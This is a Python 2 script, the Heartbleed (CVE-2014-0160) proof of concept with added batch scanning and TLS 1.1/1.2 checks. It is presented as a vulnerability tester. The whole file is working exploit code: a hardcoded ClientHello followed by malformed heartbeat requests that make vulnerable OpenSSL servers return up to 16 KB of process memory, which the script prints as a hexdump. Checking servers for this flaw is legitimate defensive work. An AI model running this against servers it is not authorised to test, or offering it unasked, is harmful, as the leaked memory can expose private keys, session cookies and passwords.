#!/usr/bin/env python2
 
# Quick and dirty demonstration of CVE-2014-0160 by Jared Stafford (jspenguin@jspenguin.org)
# The author disclaims copyright to this source code.
#
# Batch operations and dual TLS1.1/1.2 testing added by Starchy Grant (starchy@eff.org)
 
import sys
import struct
import socket
import time
import select
import re
from optparse import OptionParser

options = OptionParser(usage='%prog server [options]', description='Test for SSL heartbeat vulnerability (CVE-2014-0160)')
options.add_option('-b', '--batch', type='string', help='test multiple hostnames from file')
options.add_option('-p', '--port', type='int', default=443, help='TCP port to test (default: 443)')
options.add_option('-s', '--starttls', action='store_true', default=False, help='Check STARTTLS')
options.add_option('-d', '--debug', action='store_true', default=False, help='Enable debug output')
options.add_option('-l', '--line', action='store_true', default=False, help='Line mode - print lines instead of hex')
 
def h2bin(x):
    return x.replace(' ', '').replace('\n', '').decode('hex')
 
hello = h2bin('''
16 03 02 00  dc 01 00 00 d8 03 02 53
43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf
bd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00
00 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 88
00 87 c0 0f c0 05 00 35  00 84 c0 12 c0 08 c0 1c
c0 1b 00 16 00 13 c0 0d  c0 03 00 0a c0 13 c0 09
c0 1f c0 1e 00 33 00 32  00 9a 00 99 00 45 00 44
c0 0e c0 04 00 2f 00 96  00 41 c0 11 c0 07 c0 0c
c0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11
00 08 00 06 00 03 00 ff  01 00 00 49 00 0b 00 04
03 00 01 02 00 0a 00 34  00 32 00 0e 00 0d 00 19
00 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 08
00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13
00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00
00 0f 00 01 01                                  
''')
 
hb12 = h2bin(''' 
18 03 02 00 03
01 40 00
''')

hb11 = h2bin(''' 
18 03 01 00 03
01 40 00
''')
 
def hexdump(s):
    for b in xrange(0, len(s), 16):
        lin = [c for c in s[b : b + 16]]
        hxdat = ' '.join('%02X' % ord(c) for c in lin)
        pdat = ''.join((c if 32 <= ord(c) <= 126 else '.' )for c in lin)
        print '  %04x: %-48s %s' % (b, hxdat, pdat)
    print

def linedump(s):
    lin = ""
    for b in s:
      if 32 <= ord(b) <= 126:
        lin = lin + b 
      elif b == "\n":
        lin = lin + "\n"
      else:
        lin = lin + "." 
    print lin
 
def recvall(s, length, timeout=5):
    endtime = time.time() + timeout
    rdata = ''
    remain = length
    while remain > 0:
        rtime = endtime - time.time()
        if rtime < 0:
            return None
        r, w, e = select.select([s], [], [], 5)
        if s in r:
            try:
                data = s.recv(remain)
            except socket.error, (value, message):
                if s:
                    s.close()
                    print message
                    return None
            # EOF?
            if not data:
                return None
            rdata += data
            remain -= len(data)
    return rdata
        
 
def recvmsg(s):
    hdr = recvall(s, 5)
    if hdr is None:
        print 'Unexpected EOF receiving record header - server closed connection'
        return None, None, None
    typ, ver, ln = struct.unpack('>BHH', hdr)
    pay = recvall(s, ln, 10)
    if pay is None:
        print 'Unexpected EOF receiving record payload - server closed connection'
        return None, None, None
    print ' ... received message: type = %d, ver = %04x, length = %d' % (typ, ver, len(pay))
    return typ, ver, pay
 
def hit_hb(s,opts,hb):
    s.send(hb)
    while True:
        typ, ver, pay = recvmsg(s)
        if typ is None:
            print 'No heartbeat response received, server likely not vulnerable'
            return False
 
        if typ == 24:
            print 'Received heartbeat response:'
            if opts.line:
              linedump(pay)
            else:
              hexdump(pay)
            if len(pay) > 3:
                print 'WARNING: server returned more data than it should - server is vulnerable!'
            else:
                print 'Server processed malformed heartbeat, but did not return any extra data.'
            return True
 
        if typ == 21:
            print 'Received alert:'
            hexdump(pay)
            print 'Server returned error, likely not vulnerable'
            return False
 
def test_host(hostname, opts, args):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    if not opts.batch:
        print 'Connecting...'
    sys.stdout.flush()
    try:
        s.connect((hostname, opts.port))
    except socket.error, (value, message):
        if s:
            s.close()
            print message
            return False

    if opts.starttls:
        re = s.recv(4096)
        if opts.debug: print re
        s.send('ehlo starttlstest\n')
        re = s.recv(1024)
        if opts.debug: print re
        if not 'STARTTLS' in re:
            if opts.debug: print re
            print 'STARTTLS not supported...'
            sys.exit(0)
        s.send('starttls\n')
        re = s.recv(1024)
    
    if not opts.batch:
        print 'Sending Client Hello...'
    sys.stdout.flush()
    s.send(hello)
    if not opts.batch:
        print 'Waiting for Server Hello...'
    sys.stdout.flush()
    while True:
        typ, ver, pay = recvmsg(s)
        if typ == None:
            if not opts.batch:
                print 'Server closed connection without sending Server Hello.'
            return
        # Look for server hello done message.
        if typ == 22 and ord(pay[0]) == 0x0E:
            break
 
    if not opts.batch:
        print 'Sending heartbeat request...'
    sys.stdout.flush()
    s.send(hb11)
    test11 = hit_hb(s,opts,hb11)
    s.send(hb12)
    test12 = hit_hb(s,opts,hb12)
    return test11 or test12
    
def batch(opts, args):
    hosts=[]
    passed=[]
    failed=[]
    filename=opts.batch
    try:
        f = open(filename,'r')
    except IOError, args:
        print 'Unable to open file for reading: ', args
        sys.exit(1)

    hosts = (line.strip() for line in f)

    for host in hosts:
        if opts.debug:
            print "Testing ", host, "..."
            print "..."
        if test_host(host, opts, args):
            failed.append(host)
        else:
            passed.append(host)

    print "These hosts did not show specific signs of the heartbleed vulnerability:"
    print ""
    for host in passed:
        print host
    if len(failed) == 0:
        return 0
    else:
        print "WARNING: These servers appear vulnerable to heartbleed:"
        print ""
        for host in failed:
            print host
            return 1


def main():
    opts, args = options.parse_args()

    if opts.batch:
        return(batch(opts, args))

    if len(args) < 1:
        options.print_help()
        return

    test_host(args[0], opts, args)
 
 
if __name__ == '__main__':
    main()
